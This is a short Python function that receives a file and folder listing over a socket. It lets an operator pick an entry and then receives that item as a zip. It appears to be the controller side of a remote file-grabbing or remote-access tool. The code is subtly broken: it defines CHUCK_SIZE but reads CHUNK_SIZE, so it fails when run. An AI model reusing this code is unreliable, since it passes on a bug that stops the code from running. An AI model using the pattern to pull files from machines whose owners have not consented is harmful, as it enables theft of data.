import json

CHUCK_SIZE = 4 * 1024
DELIMETER = "<END_OF_RESULTS>"


def receiveFileFolders(my_socket):
    print("[+] Receiving Files/Folders")
    full_list = b''
    while True:
        chunk = my_socket.client_conn.recv(CHUNK_SIZE)
        if chunk.endswith(DELIMETER.encode()):
            chunk = chunk[:-len(DELIMETER)]
            full_list += chunk
            break
        full_list += chunk

    file_dict = json.loads(full_list)

    for index in file_dict:
        print("\t\t", index, "\t", file_dict[index])
    
    file_index = input("[+] Select the file/folder")
    file2download = file_dict[file_index]
    my_socket.sendData(file2download)
    zipped_file = file2download + ".zip"
    my_socket.receiveZipped(zipped_file)